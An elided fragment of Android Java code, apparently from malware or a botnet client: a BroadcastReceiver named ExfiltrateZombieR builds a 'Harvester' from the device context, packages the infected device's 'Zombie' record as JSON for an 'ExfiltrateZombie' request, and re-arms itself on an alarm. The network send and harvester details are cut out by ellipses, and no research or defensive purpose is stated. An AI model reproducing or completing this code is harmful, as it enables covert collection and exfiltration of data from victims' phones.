...
public class ExfiltrateZombieR extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEV_MODE) {
            Log.i(TAG, ExfiltrateZombieR.class.getName() + "->onReceive:receiver started...");
        }

        Harvester harvester = new Harvester(context);

        Zombie zombie = harvester.getZombie();

        if (zombie != null) {
            Parameter                           params     = new Parameter("ExfiltrateZombie", zombie.toJSON());
    ...
    private void setAlarm(Context context) {
        ...
        Intent        intent        = new Intent(context, ExfiltrateZombieR.class);
